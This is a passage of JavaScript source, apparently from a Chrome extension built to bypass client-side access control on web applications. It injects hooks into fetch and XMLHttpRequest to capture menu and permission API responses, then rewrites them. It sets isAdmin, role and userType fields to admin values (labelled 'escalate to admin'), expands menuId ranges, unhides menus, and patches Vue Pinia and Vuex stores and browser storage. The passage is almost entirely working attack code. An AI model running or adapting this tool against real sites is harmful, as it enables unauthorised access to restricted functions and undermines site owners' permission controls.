        if (json && typeof json === 'object' && !Array.isArray(json)) {
          if (json.data !== undefined) return json.data;
          if (json.result !== undefined) return json.result;
          if (json.Data !== undefined) return json.Data;
          if (json.Result !== undefined) return json.Result;
        }
        return json;
      } catch (e) {
        return text;
      }
    }

    var captured = [];

    var originalFetch = window.fetch;
    window.fetch = function () {
      var args = arguments;
      return originalFetch
        .apply(this, args)
        .then(function (response) {
          if (window.__PERM_INTERCEPTOR__ && window.__PERM_INTERCEPTOR__.active) {
            var url = typeof args[0] === 'string' ? args[0] : (args[0] && args[0].url) || '';
            var isMenuApi = URL_MENU_PATTERNS.some(function (p) {
              return p.test(url);
            });
            if (isMenuApi) {
              var override = window.__PERM_INTERCEPTOR__._overrideData;
              if (override !== null && override !== undefined) {
                var overrideBody = JSON.stringify(override);
                try {
                  var info = classifyResponse(override, url);
                  if (info.type !== 'other') {
                    captured.push({
                      url: url,
                      type: info.type,
                      subtype: info.subtype,
                      data: override,
                      rawText: overrideBody,
                      size: overrideBody.length,
                      timestamp: Date.now(),
                      method: 'fetch-override',
                    });
                  }
                } catch (e) {}
                return new Response(overrideBody, {
                  status: response.status,
                  statusText: response.statusText,
                  headers: response.headers,
                });
              } else {
                var cloned = response.clone();
                cloned
                  .text()
                  .then(function (text) {
                    try {
                      var parsed = parseBody(text);
                      var info = classifyResponse(parsed, url);
                      if (info.type !== 'other') {
                        captured.push({
                          url: url,
                          type: info.type,
                          subtype: info.subtype,
                          data: parsed,
                          rawText: text,
                          size: text.length,
                          timestamp: Date.now(),
                          method: 'fetch',
                        });
                      }
                    } catch (e) {}
                  })
                  .catch(function () {});
              }
            }
          }
          return response;
        })
        .catch(function (err) {
          throw err;
        });
    };

    var origOpen = XMLHttpRequest.prototype.open;
    var origSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function (method, url) {
      this.__perm_url = url;
      return origOpen.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function () {
      var self = this;
      if (window.__PERM_INTERCEPTOR__ && window.__PERM_INTERCEPTOR__.active && this.__perm_url) {
        var url = this.__perm_url;
        var isMenuApi = URL_MENU_PATTERNS.some(function (p) {
          return p.test(url);
        });
        if (isMenuApi) {
          this.addEventListener('readystatechange', function () {
            if (self.readyState === 4) {
              var override = window.__PERM_INTERCEPTOR__._overrideData;
              var originalText = self.responseText;
              if (override !== null && override !== undefined) {
                try {
                  var overrideBody = JSON.stringify(override);
                  Object.defineProperty(self, 'responseText', {
                    value: overrideBody,
                    writable: true,
                    configurable: true,
                  });
                  Object.defineProperty(self, 'response', {
                    value: overrideBody,
                    writable: true,
                    configurable: true,
                  });
                } catch (e) {}
              }
              try {
                var text =
                  override !== null && override !== undefined
                    ? JSON.stringify(override)
                    : originalText;
                if (!text) return;
                var parsed = parseBody(text);
                var info = classifyResponse(parsed, url);
                if (info.type !== 'other') {
                  captured.push({
                    url: url,
                    type: info.type,
                    subtype: info.subtype,
                    data: parsed,
                    rawText: text,
                    size: text.length,
                    timestamp: Date.now(),
                    method: override != null ? 'xhr-override' : 'xhr',
                  });
                }
              } catch (e) {}
            }
          });
        }
      }
      return origSend.apply(this, arguments);
    };

    window.__PERM_INTERCEPTOR__ = {
      active: true,
      captured: captured,
      getCaptured: function () {
        return captured;
      },
      clear: function () {
        captured.length = 0;
      },
      stop: function () {
        this.active = false;
      },
      start: function () {
        this.active = true;
      },
      _overrideData: null,
      getOverride: function () {
        return this._overrideData;
      },
      setOverride: function (d) {
        this._overrideData = d;
      },
    };
    return 'injected';
  };

  async function startPermInterception() {
    var statusEl = utils.get('perm-status');
    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab?.id) {
        if (statusEl) statusEl.textContent = '无法获取当前标签页';
        return;
      }
      var results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        world: 'MAIN',
        func: permInterceptorFunc,
      });
      var status = results && results[0] && results[0].result;
      if (status === 'already_injected') {
        chrome.scripting.executeScript({
          target: { tabId: tab.id },
          world: 'MAIN',
          func: function () {
            if (window.__PERM_INTERCEPTOR__) window.__PERM_INTERCEPTOR__.start();
          },
        });
      }
      permInterceptActive = true;
      chrome.storage.local.set({ permInterceptTabId: tab.id });
      utils.get('perm-start-btn').disabled = true;
      utils.get('perm-stop-btn').disabled = false;
      if (statusEl) statusEl.textContent = '拦截中... 请操作页面触发菜单API请求，或刷新页面';
      utils.showToast('拦截已启动，请操作页面或刷新页面', 'success');
      // Try to read already-loaded data from Vue/Pinia/Vuex stores
      try {
        await chrome.scripting.executeScript({
          target: { tabId: tab.id },
          world: 'MAIN',
          func: function () {
            if (!window.__PERM_INTERCEPTOR__) return;
            var MENU_KEYWORDS = [
              'menu',
              'menulist',
              'menuList',
              'menuData',
              'permission',
              'permissions',
              'permList',
              'menuIds',
              'isAdmin',
              'isadmin',
              'role',
              'roles',
              'navList',
              'sideMenu',
              'sidebar',
            ];
            function classifyStr(str, url) {
              var urlLower = (url || '').toLowerCase();
              if (/permission/i.test(urlLower)) return 'permission';
              if (/role/i.test(urlLower)) return 'role';
              if (/menu/i.test(urlLower)) return 'menu';
              for (var i = 0; i < MENU_KEYWORDS.length; i++) {
                if (str.indexOf(MENU_KEYWORDS[i]) !== -1) return 'menu';
              }
              return 'other';
            }
            function sanitizeForTransfer(obj, depth) {
              if (obj === null || obj === undefined) return obj;
              if (typeof obj === 'string' || typeof obj === 'number' || typeof obj === 'boolean')
                return obj;
              if (typeof obj === 'function') return '[function]';
              if (obj instanceof HTMLElement) return '[HTMLElement]';
              if (obj instanceof RegExp) return '[RegExp]';
              if (depth > 12) return '[max-depth]';
              if (Array.isArray(obj)) {
                return obj.map(function (item) {
                  return sanitizeForTransfer(item, depth + 1);
                });
              }
              if (typeof obj === 'object') {
                var skipKeys = {
                  component: 1,
                  _Ctor: 1,
                  _compiled: 1,
                  _scopeId: 1,
                  staticRenderFns: 1,
                  render: 1,
                  beforeCreate: 1,
                  created: 1,
                  beforeMount: 1,
                  mounted: 1,
                  beforeUpdate: 1,
                  updated: 1,
                  beforeDestroy: 1,
                  destroyed: 1,
                  activated: 1,
                  deactivated: 1,
                  mixins: 1,
                  extends: 1,
                  directives: 1,
                  filters: 1,
                  _ssrRegister: 1,
                  __file: 1,
                  _functional: 1,
                  _inject: 1,
                  _provided: 1,
                  model: 1,
                  inheritAttrs: 1,
                  comments: 1,
                };
                var result = {};
                try {
                  var keys = Object.keys(obj);
                  for (var i = 0; i < keys.length; i++) {
                    var k = keys[i];
                    if (skipKeys[k]) {
                      if (k === 'component') {
                        var v = obj[k];
                        result[k] =
                          v && (v.name || v.__name || v.displayName)
                            ? '[component: ' + (v.name || v.__name || v.displayName) + ']'
                            : '[component]';
                      }
                      continue;
                    }
                    result[k] = sanitizeForTransfer(obj[k], depth + 1);
                  }
                } catch (e) {
                  return '[error-reading-keys]';
                }
                return result;
              }
              return String(obj);
            }
            function tryAdd(data, url) {
              if (!data || typeof data === 'string') return;
              var cap = window.__PERM_INTERCEPTOR__.captured;
              for (var di = 0; di < cap.length; di++) {
                if (cap[di].url === url && cap[di].method === 'store-read') return;
              }
              var clean = sanitizeForTransfer(data, 0);
              var str = JSON.stringify(clean);
              var type = classifyStr(str, url);
              if (type !== 'other') {
                cap.push({
                  url: url,
                  type: type,
                  subtype: null,
                  data: clean,
                  rawText: str,
                  size: str.length,
                  timestamp: Date.now(),
                  method: 'store-read',
                });
              }
            }
            // Check Vue 3 Pinia stores
            var appEl =
              document.querySelector('#app') ||
              document.querySelector('[data-v-app]') ||
              document.querySelector('[id^="app"]') ||
              document.querySelector('#root') ||
              document.querySelector('#application') ||
              document.querySelector('#main');
            if (appEl && appEl.__vue_app__) {
              var pinia = appEl.__vue_app__.config.globalProperties.$pinia;
              if (pinia && pinia._s) {
                pinia._s.forEach(function (store, id) {
                  var state = store.$state;
                  for (var key in state) {
                    if (
                      /menu|permission|nav|route|sidebar/i.test(key) &&
                      (Array.isArray(state[key]) ||
                        (typeof state[key] === 'object' && state[key] !== null))
                    ) {
                      tryAdd(state[key], 'pinia://' + id + '/' + key);
                    }
                  }
                });
              }
            }
            // Check Vue 2 Vuex store
            var allEls = document.querySelectorAll('*');
            for (var i = 0; i < allEls.length; i++) {
              if (allEls[i].__vue__) {
                var vm = allEls[i].__vue__.$root || allEls[i].__vue__;
                if (vm.$store && vm.$store.state) {
                  for (var key in vm.$store.state) {
                    if (
                      /menu|permission|nav|route|sidebar/i.test(key) &&
                      (Array.isArray(vm.$store.state[key]) ||
                        (typeof vm.$store.state[key] === 'object' && vm.$store.state[key] !== null))
                    ) {
                      tryAdd(vm.$store.state[key], 'vuex://state/' + key);
                    }
                  }
                }
                break;
              }
            }
            // Check localStorage for menu-like keys
            var storagePrefixes = ['menu', 'permission', 'routes', 'nav', 'sidebar'];
            for (var s = 0; s < localStorage.length; s++) {
              var storageKey = localStorage.key(s);
              if (storageKey) {
                for (var p = 0; p < storagePrefixes.length; p++) {
                  if (storageKey.toLowerCase().indexOf(storagePrefixes[p]) !== -1) {
                    try {
                      var parsed = JSON.parse(localStorage.getItem(storageKey));
                      tryAdd(parsed, 'localStorage://' + storageKey);
                    } catch (e) {}
                    break;
                  }
                }
              }
            }
          },
        });
      } catch (e) {
        // Non-critical: store reading is best-effort
      }
      renderPermList();
      startPermAutoRefresh();
    } catch (e) {
      if (statusEl) statusEl.textContent = '启动失败: ' + e.message;
    }
  }

  async function stopPermInterception() {
    stopPermAutoRefresh();
    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab?.id) return;
      await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        world: 'MAIN',
        func: function () {
          if (window.__PERM_INTERCEPTOR__) window.__PERM_INTERCEPTOR__.stop();
        },
      });
      permInterceptActive = false;
      chrome.storage.local.remove('permInterceptTabId');
      utils.get('perm-start-btn').disabled = false;
      utils.get('perm-stop-btn').disabled = true;
      var statusEl = utils.get('perm-status');
      if (statusEl) statusEl.textContent = '拦截已停止';
      utils.showToast('拦截已停止', 'info');
    } catch (e) {
      permInterceptActive = false;
      chrome.storage.local.remove('permInterceptTabId');
      var statusEl = utils.get('perm-status');
      if (statusEl) statusEl.textContent = '停止失败: ' + (e.message || '未知错误');
      utils.showToast('停止拦截失败', 'error');
    }
  }

  async function refreshPermCaptured() {
    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab?.id) return;
      var results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        world: 'MAIN',
        func: function () {
          return window.__PERM_INTERCEPTOR__ ? window.__PERM_INTERCEPTOR__.getCaptured() : [];
        },
      });
      permCapturedData = (results && results[0] && results[0].result) || [];
      renderPermList();
    } catch (e) {
      utils.showToast('获取捕获数据失败', 'error');
    }
  }

  function renderPermList() {
    var container = utils.get('perm-captured-list');
    var countEl = utils.get('perm-count');
    if (!container) return;
    var filterVal = (utils.get('perm-filter') ? utils.get('perm-filter').value : '').toLowerCase();
    var typeFilter = utils.get('perm-type-filter') ? utils.get('perm-type-filter').value : 'all';

    var filtered = permCapturedData.filter(function (item) {
      if (filterVal && item.url.toLowerCase().indexOf(filterVal) === -1) return false;
      if (typeFilter !== 'all' && item.type !== typeFilter) return false;
      return true;
    });

    if (filtered.length === 0) {
      container.innerHTML = '<div class="empty-state">暂无捕获数据，请先操作页面触发菜单请求</div>';
      if (countEl)
        countEl.textContent =
          permCapturedData.length > 0 ? '共 ' + permCapturedData.length + ' 条 (筛选后 0)' : '';
      return;
    }

    if (countEl)
      countEl.textContent =
        '共 ' +
        permCapturedData.length +
        ' 条' +
        (filtered.length < permCapturedData.length ? ' (显示 ' + filtered.length + ')' : '');

    var html = '';
    for (var i = 0; i < filtered.length; i++) {
      var item = filtered[i];
      var realIdx = permCapturedData.indexOf(item);
      var cls = classifyPermType(item.data);
      var clsLabel = cls.label.split(' - ')[0];
      html += '<div class="perm-item" data-idx="' + realIdx + '">';
      html += '<span class="perm-item-type type-' + item.type + '">' + item.type + '</span>';
      html += '<span class="perm-item-cls ' + cls.cssClass + '">' + clsLabel + '</span>';
      html += '<span class="perm-item-url" title="' + utils.escapeHtml(item.url) + '">';
      html += utils.escapeHtml(item.url) + '</span>';
      html += '<span class="perm-item-size">' + (item.size / 1024).toFixed(1) + 'KB</span>';
      html += '</div>';
    }
    container.innerHTML = html;

    container.querySelectorAll('.perm-item').forEach(function (el) {
      el.addEventListener('click', function () {
        permSelectedIndex = parseInt(this.dataset.idx);
        showPermDetail(permSelectedIndex);
      });
    });
  }

  function showPermDetail(idx) {
    var item = permCapturedData[idx];
    if (!item) return;
    permViewMode = 'detail';
    utils.get('perm-captured-list').classList.add('hidden');
    var filterRow = utils.get('perm-filter-row');
    if (filterRow) filterRow.classList.add('hidden');
    utils.get('perm-detail').classList.remove('hidden');
    utils.get('perm-detail-url').textContent = item.url;
    utils.get('perm-detail-type').textContent = item.type.toUpperCase();

    var classification = classifyPermType(item.data);
    var classifyEl = utils.get('perm-classify');
    classifyEl.textContent = classification.label;
    classifyEl.className = 'perm-classify ' + classification.cssClass;

    if (typeof showPermSuggestions === 'function') showPermSuggestions(classification);

    utils.get('perm-json-editor').value = JSON.stringify(item.data, null, 2);
  }

  function classifyPermType(data) {
    if (data && typeof data === 'object' && !Array.isArray(data)) {
      var keys = Object.keys(data);
      for (var k = 0; k < keys.length; k++) {
        if (
          /^(isadmin|admin|is_superuser|isvip|vip|role|isSuperAdmin|userType|user_type|level|grade)$/i.test(
            keys[k]
          )
        ) {
          var val = data[keys[k]];
          if (val === 0 || val === false || val === '0' || val === '' || val === null) {
            return {
              label: '特殊0开放 - ' + keys[k] + '=' + val + '，可修改为1/true/admin',
              cssClass: 'perm-classify-danger',
              type: 'special-zero',
            };
          }
          return {
            label: '特殊0开放 - 检测到角色控制字段',
            cssClass: 'perm-classify-warning',
            type: 'special-zero',
          };
        }
      }
      for (var kt = 0; kt < keys.length; kt++) {
        if (/^type$/i.test(keys[kt])) {
          var tval = data[keys[kt]];
          var roleVals = /^(admin|superadmin|user|vip|normal|guest|member|manager)$/i;
          if (
            (typeof tval === 'string' && roleVals.test(tval)) ||
            (typeof tval === 'number' && tval >= 0 && tval <= 10)
          ) {
            if (tval === 0 || /^(user|normal|guest)$/i.test(String(tval))) {
              return {
                label: '特殊0开放 - ' + keys[kt] + '=' + tval + '，可修改为admin/1',
                cssClass: 'perm-classify-danger',
                type: 'special-zero',
              };
            }
            return {
              label: '特殊0开放 - 检测到角色控制字段 type=' + tval,
              cssClass: 'perm-classify-warning',
              type: 'special-zero',
            };
          }
        }
      }
      for (var k2 = 0; k2 < keys.length; k2++) {
        if (/menuIds|menu_ids|menuIdList|permissionIds|permIds/i.test(keys[k2])) {
          var arr = data[keys[k2]];
          if (
            Array.isArray(arr) &&
            arr.length > 0 &&
            arr.every(function (v) {
              return typeof v === 'number';
            })
          ) {
            return {
              label: '菜单ID限制 - ' + keys[k2] + ': [' + arr.join(',') + ']，可展开范围',
              cssClass: 'perm-classify-info',
              type: 'menuid-limit',
            };
          }
        }
      }
    }
    if (Array.isArray(data) && data.length > 0) {
      var allHaveShowField = data.every(function (item) {
        return (
          item &&
          typeof item === 'object' &&
          ('isshow' in item ||
            'isShow' in item ||
            'hidden' in item ||
            'display' in item ||
            'status' in item)
        );
      });
      if (allHaveShowField) {
        var hasHidden = data.some(function (item) {
          return (
            item.isshow === '0' ||
            item.isShow === '0' ||
            item.hidden === true ||
            item.display === false ||
            item.status === 0
          );
        });
        if (hasHidden) {
          return {
            label: '全开放 - 所有菜单已返回，部分标记为隐藏 (isshow/display)',
            cssClass: 'perm-classify-success',
            type: 'full-open',
          };
        }
        return {
          label: '全开放 - 所有菜单已返回且均已显示',
          cssClass: 'perm-classify-success',
          type: 'full-open',
        };
      }
      return {
        label: '半开放 - 返回了部分菜单列表',
        cssClass: 'perm-classify-info',
        type: 'semi-open',
      };
    }
    if (Array.isArray(data) && data.length === 0) {
      return {
        label: '0开放 - 菜单返回为空，需要搜索JS源码',
        cssClass: 'perm-classify-danger',
        type: 'zero-open',
      };
    }
    if (data && typeof data === 'object' && !Array.isArray(data)) {
      var inner = data.data || data.result || data.Data;
      if (Array.isArray(inner) && inner.length === 0) {
        return {
          label: '0开放 - 菜单返回为空，需要搜索JS源码',
          cssClass: 'perm-classify-danger',
          type: 'zero-open',
        };
      }
    }
    return {
      label: '未知类型 - 请手动检查数据结构',
      cssClass: 'perm-classify-unknown',
      type: 'unknown',
    };
  }

  function showPermSuggestions(classification) {
    var sugEl = utils.get('perm-suggestions');
    if (!sugEl) return;
    var cType = classification.type || 'unknown';
    var html = '<span class="perm-suggestion-hint">建议操作：</span>';

    // Reset highlight on all action buttons
    var actionBtns = document.querySelectorAll('.perm-detail-actions .btn');
    actionBtns.forEach(function (b) {
      b.classList.remove('btn-suggested');
    });

    if (cType === 'full-open') {
      // Highlight existing "全部显示" button instead of duplicating
      var openAllBtn = utils.get('perm-open-all');
      if (openAllBtn) openAllBtn.classList.add('btn-suggested');
      html += '<span class="perm-suggestion-hint">点击下方高亮的「全部显示」按钮</span>';
    } else if (cType === 'semi-open') {
      html +=
        '<button class="btn btn-sm btn-primary" id="sug-compare-inject">对比并补全缺失菜单</button>';
    } else if (cType === 'zero-open') {
      html +=
        '<button class="btn btn-sm btn-primary" id="sug-auto-search">自动搜索JS菜单定义</button>';
    } else if (cType === 'special-zero') {
      // Highlight existing "提权至管理员" button
      var adminBtn = utils.get('perm-change-admin');
      if (adminBtn) adminBtn.classList.add('btn-suggested');
      html += '<span class="perm-suggestion-hint">点击下方高亮的「提权至管理员」按钮</span>';
    } else if (cType === 'menuid-limit') {
      // Highlight existing "展开menuIds" button
      var expandBtn = utils.get('perm-expand-ids');
      if (expandBtn) expandBtn.classList.add('btn-suggested');
      html += '<span class="perm-suggestion-hint">点击下方高亮的「展开menuIds」按钮</span>';
    } else {
      sugEl.innerHTML = '';
      sugEl.classList.add('hidden');
      return;
    }
    sugEl.innerHTML = html;
    sugEl.classList.remove('hidden');

    var sugCompareInject = utils.get('sug-compare-inject');
    if (sugCompareInject)
      sugCompareInject.addEventListener('click', async function () {
        switchVueSubTab('compare');
        await compareRoutesAndMenu();
        if (lastCompareHiddenRoutes.length > 0) {
          switchVueSubTab('perm');
          if (permSelectedIndex < 0 && permCapturedData.length > 0) {
            permSelectedIndex = 0;
            showPermDetail(0);
          }
          autoInjectHiddenRoutes();
        } else {
          utils.showToast('路由对比未发现隐藏路由', 'info');
          switchVueSubTab('perm');
        }
      });
    var sugAutoSearch = utils.get('sug-auto-search');
    if (sugAutoSearch) sugAutoSearch.addEventListener('click', autoSearchForZeroOpen);
  }

  function transformShowAll(data) {
    if (Array.isArray(data)) {
      return data.map(function (item) {
        if (item && typeof item === 'object') {
          var c = {};
          for (var k in item) {
            if (item.hasOwnProperty(k)) c[k] = item[k];
          }
          if ('isshow' in c) c.isshow = '1';
          if ('isShow' in c) c.isShow = '1';
          if ('hidden' in c) c.hidden = false;
          if ('display' in c) c.display = true;
          if ('status' in c) c.status = 1;
          if ('visible' in c) c.visible = true;
          if (c.children) c.children = transformShowAll(c.children);
          if (c.child) c.child = transformShowAll(c.child);
          if (c.subList) c.subList = transformShowAll(c.subList);
          return c;
        }
        return item;
      });
    }
    if (data && typeof data === 'object') {
      var c = {};
      for (var k in data) {
        if (data.hasOwnProperty(k)) c[k] = transformShowAll(data[k]);
      }
      return c;
    }
    return data;
  }

  function permOpenAll() {
    var editor = utils.get('perm-json-editor');
    try {
      var data = JSON.parse(editor.value);
      data = transformShowAll(data);
      editor.value = JSON.stringify(data, null, 2);
      utils.showToast('已将所有 isshow/display 改为显示', 'success');
    } catch (e) {
      utils.showToast('JSON 解析失败', 'error');
    }
  }

  function transformAdmin(data) {
    if (typeof data !== 'object' || data === null) return data;
    if (Array.isArray(data)) return data.map(transformAdmin);
    var c = {};
    for (var k in data) {
      if (!data.hasOwnProperty(k)) continue;
      if (
        /^(isadmin|admin|is_superuser|isvip|vip|role|isSuperAdmin|userType|user_type|level|grade)$/i.test(
          k
        )
      ) {
        c[k] = typeof data[k] === 'string' ? '1' : 1;
      } else if (k === 'roleId' || k === 'role_id') {
        c[k] = 1;
      } else if (/^type$/i.test(k)) {
        var tv = data[k];
        var roleVals = /^(admin|superadmin|user|vip|normal|guest|member|manager)$/i;
        if (
          (typeof tv === 'string' && roleVals.test(tv)) ||
          (typeof tv === 'number' && tv >= 0 && tv <= 10)
        ) {
          c[k] = typeof tv === 'string' ? 'admin' : 1;
        } else {
          c[k] = tv;
        }
      } else if (typeof data[k] === 'object') {
        c[k] = transformAdmin(data[k]);
      } else {
        c[k] = data[k];
      }
    }
    return c;
  }

  function permChangeAdmin() {
    var editor = utils.get('perm-json-editor');
    try {
      var data = JSON.parse(editor.value);
      data = transformAdmin(data);
      editor.value = JSON.stringify(data, null, 2);
      utils.showToast('已提权：角色/管理员字段已修改', 'success');
    } catch (e) {
      utils.showToast('JSON 解析失败', 'error');
    }
  }

  function expandMenuIds(data) {
    if (typeof data !== 'object' || data === null) return data;
    if (Array.isArray(data)) return data.map(expandMenuIds);
    var c = {};
    for (var k in data) {
      if (!data.hasOwnProperty(k)) continue;
      if (/menuIds|menu_ids|menuIdList|permissionIds|permIds/i.test(k) && Array.isArray(data[k])) {
        var allNum = data[k].every(function (v) {
          return typeof v === 'number';
        });
        if (allNum && data[k].length > 0) {
          var max = Math.max.apply(null, data[k]);
          var end = Math.max(max, 50);
          var expanded = [];
          for (var i = 1; i <= end; i++) expanded.push(i);
          c[k] = expanded;
          if (data.hasOwnProperty('total') || data.hasOwnProperty('Total')) {
            var tKey = data.hasOwnProperty('total') ? 'total' : 'Total';
            c[tKey] = expanded.length;
          }
          continue;
        }
      }
      if (typeof data[k] === 'object') {
        c[k] = expandMenuIds(data[k]);
      } else {
        c[k] = data[k];
      }
    }
    return c;
  }

  function permExpandMenuIds() {
    var editor = utils.get('perm-json-editor');
    try {
      var data = JSON.parse(editor.value);
      data = expandMenuIds(data);
      editor.value = JSON.stringify(data, null, 2);
      utils.showToast('已展开菜单ID范围', 'success');
    } catch (e) {
      utils.showToast('JSON 解析失败', 'error');
    }
  }

  async function applyPermOverride() {
    var editor = utils.get('perm-json-editor');
    var modifiedData;
    try {
      modifiedData = JSON.parse(editor.value);
    } catch (e) {
      utils.showToast('JSON 格式错误', 'error');
      return;
    }

    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab?.id) {
        utils.showToast('无法获取当前标签页', 'error');
        return;
      }
      var results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        world: 'MAIN',
        func: function (overrideData) {
          if (!window.__PERM_INTERCEPTOR__) return false;
          window.__PERM_INTERCEPTOR__.setOverride(overrideData);

          function patchDeepState(state, override) {
            if (!state || typeof state !== 'object' || Array.isArray(state)) return false;
            for (var key in state) {
              if (!state.hasOwnProperty(key)) continue;
              if (!/menu|permission|route|nav|sidebar/i.test(key)) continue;
              var val = state[key];
              if (Array.isArray(val)) {
                if (typeof state.__ob__ === 'object' && state.__ob__) {
                  try {
                    state[key].splice(0, state[key].length);
                  } catch (e) {}
                  try {
                    override.forEach(function (item) {
                      state[key].push(item);
                    });
                  } catch (e) {}
                } else {
                  state[key] = override;
                }
                return true;
              }
              if (val && typeof val === 'object' && !Array.isArray(val)) {
                if (patchDeepState(val, override)) return true;
              }
            }
            return false;
          }

          // Vue 3 + Pinia
          var appEl =
            document.querySelector('#app') ||
            document.querySelector('[data-v-app]') ||
            document.querySelector('[id^="app"]') ||
            document.querySelector('#root') ||
            document.querySelector('#application') ||
            document.querySelector('#main');
          if (appEl && appEl.__vue_app__) {
            var pinia = appEl.__vue_app__.config.globalProperties.$pinia;
            if (pinia && pinia._s) {
              pinia._s.forEach(function (store) {
                var state = store.$state;
                for (var key in state) {
                  if (!state.hasOwnProperty(key)) continue;
                  if (!/menu|permission|route|nav|sidebar/i.test(key)) continue;
                  var val = state[key];
                  if (Array.isArray(val)) {
                    if (store.$patch) {
                      var patch = {};
                      patch[key] = overrideData;
                      store.$patch(patch);
                    } else {
                      state[key] = overrideData;
                    }
                  } else if (val && typeof val === 'object') {
                    patchDeepState(val, overrideData);
                  }
                }
              });
            }
          }

          // Vue 2 + Vuex
          var allEls = document.querySelectorAll('*');
          for (var i = 0; i < allEls.length; i++) {
            if (allEls[i].__vue__) {
              var vm = allEls[i].__vue__.$root || allEls[i].__vue__;
              if (vm.$store && vm.$store.state) {
                patchDeepState(vm.$store.state, overrideData);
              }
              break;
            }
          }

          // Patch localStorage and sessionStorage menu caches
          var storagePatchCount = 0;
          var storagePrefixes = ['menu', 'permission', 'routes', 'nav', 'sidebar', 'role', 'auth'];
          var storageTargets = [localStorage, sessionStorage];
          for (var st = 0; st < storageTargets.length; st++) {
            var storage = storageTargets[st];
            try {
              for (var si = 0; si < storage.length; si++) {
                var sKey = storage.key(si);
                if (!sKey) continue;
                var sKeyLower = sKey.toLowerCase();
                var matched = false;
                for (var sp = 0; sp < storagePrefixes.length; sp++) {
                  if (sKeyLower.indexOf(storagePrefixes[sp]) !== -1) {
                    matched = true;
                    break;
                  }
                }
                if (!matched) continue;
                try {
                  var sVal = storage.getItem(sKey);
                  var sParsed = JSON.parse(sVal);
                  if (Array.isArray(sParsed)) {
                    storage.setItem(sKey, JSON.stringify(overrideData));
                    storagePatchCount++;
                  } else if (sParsed && typeof sParsed === 'object' && !Array.isArray(sParsed)) {
                    var patched = false;
                    for (var sk in sParsed) {
                      if (!sParsed.hasOwnProperty(sk)) continue;
                      if (
                        /menu|permission|route|nav|sidebar/i.test(sk) &&
                        Array.isArray(sParsed[sk])
                      ) {
                        sParsed[sk] = overrideData;
                        patched = true;
                      }
                    }
                    if (patched) {
                      storage.setItem(sKey, JSON.stringify(sParsed));
                      storagePatchCount++;
                    }
                  }
                } catch (e) {}
              }
            } catch (e) {}
          }

          return { success: true, storagePatchCount: storagePatchCount };
        },
        args: [modifiedData],
      });
      var overrideResult = results && results[0] && results[0].result;
      if (!overrideResult || !overrideResult.success) {
        utils.showToast('拦截器未注入，请先启动权限拦截', 'error');
        return;
      }
      var msg = '已应用修改（拦截器 + Vue存储';
      if (overrideResult.storagePatchCount > 0) {
        msg += ' + ' + overrideResult.storagePatchCount + '个本地缓存';
      }
      msg += '）→ 请在页面上点击菜单或刷新页面，检查是否出现新菜单项';
      utils.showToast(msg, 'success', 5000);
    } catch (e) {
      utils.showToast('应用失败: ' + e.message, 'error');
    }
  }

  // ====== JS Keyword Search ======
  async function searchJsKeywords(keyword) {
    var statusEl = utils.get('jssearch-status');
    var resultsEl = utils.get('jssearch-results');
    if (!keyword || keyword.length < 2) {
      utils.showToast('请输入至少2个字符', 'warning');
      return;
    }
    if (statusEl) statusEl.textContent = '搜索中...';
    lastJsMatchContexts = [];

    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab?.id) return;

      // 1. Search inline scripts
      var inlineResults = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: function (kw) {
          var matches = [];
          var seen = {};
          var scripts = document.querySelectorAll('script:not([src])');
          for (var i = 0; i < scripts.length; i++) {
            var text = scripts[i].textContent || '';
            if (text.indexOf(kw) === -1) continue;
            var lines = text.split('\n');
            for (var j = 0; j < lines.length; j++) {
              var idx = lines[j].indexOf(kw);
              while (idx !== -1) {
                var start = Math.max(0, idx - 40);
                var end = Math.min(lines[j].length, idx + kw.length + 60);
                var context = lines[j].substring(start, end).replace(/^\S*\s*/, '');
                var key = i + ':' + idx;
                if (!seen[key]) {
                  seen[key] = true;
                  matches.push({
                    source: '(inline script #' + (i + 1) + ')',
                    line: j + 1,
                    context: context,
                  });
                }
                if (matches.length >= 50) break;
                idx = lines[j].indexOf(kw, idx + 1);
              }
              if (matches.length >= 50) break;
            }
            if (matches.length >= 50) break;
          }
          // Also return external script URLs for further fetching
          var extUrls = [];
          document.querySelectorAll('script[src]').forEach(function (s) {
            extUrls.push(s.src);
          });
          return { matches: matches, extUrls: extUrls };
        },
        args: [keyword],
      });

      var inlineData = (inlineResults && inlineResults[0] && inlineResults[0].result) || {};
      var matchList = inlineData.matches || [];
      var extUrls = inlineData.extUrls || [];

      // 2. Search external scripts via background fetch proxy (parallel batches)
      var CONCURRENCY = 5;
      for (
        var batchStart = 0;
        batchStart < extUrls.length && matchList.length < 50;
        batchStart += CONCURRENCY
      ) {
        var batch = extUrls.slice(batchStart, batchStart + CONCURRENCY);
        var batchResults = await Promise.all(
          batch.map(function (url) {
            return chrome.runtime.sendMessage({ type: 'FETCH_URL', url: url }).catch(function () {
              return null;
            });
          })
        );
        for (var b = 0; b < batchResults.length && matchList.length < 50; b++) {
          var resp = batchResults[b];
          if (!resp || resp.error || !resp.data) continue;
          var text = resp.data;
          if (text && text.indexOf(keyword) !== -1) {
            var shortUrl = batch[b];
            if (shortUrl.length > 60) shortUrl = '...' + shortUrl.substring(shortUrl.length - 57);
            var lines = text.split('\n');
            for (var j = 0; j < lines.length && matchList.length < 50; j++) {
              var idx = lines[j].indexOf(keyword);
              while (idx !== -1 && matchList.length < 50) {
                var start = Math.max(0, idx - 40);
                var end = Math.min(lines[j].length, idx + keyword.length + 60);
                var context = lines[j].substring(start, end).replace(/^\S*\s*/, '');
                matchList.push({ source: shortUrl, line: j + 1, context: context });
                idx = lines[j].indexOf(keyword, idx + 1);
              }
            }
          }
        }
      }

      if (matchList.length === 0) {
        if (statusEl) statusEl.textContent = '未找到匹配';
        if (resultsEl)
          resultsEl.innerHTML =
            '<div class="empty-state">在页面JS中未找到「' + utils.escapeHtml(keyword) + '」</div>';
        return;
      }

